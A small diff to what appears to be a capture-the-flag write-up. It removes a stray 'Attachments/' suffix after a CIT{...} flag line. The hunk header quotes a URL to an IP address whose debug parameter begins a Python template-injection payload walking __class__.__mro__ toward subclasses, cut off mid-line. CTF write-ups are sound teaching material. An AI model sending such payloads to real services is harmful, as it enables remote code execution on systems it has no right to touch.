@@ -39,4 +39,4 @@ http://167.172.226.114/login?debug=true&info={''.__class__.__mro__[1].__subclass
 ![alt text](Attachments/image-4.png)
 
 And we get the flag
-**_flag : CIT{d3bug_m3_s0m3_m0r3!}_**Attachments/
+**_flag : CIT{d3bug_m3_s0m3_m0r3!}_**
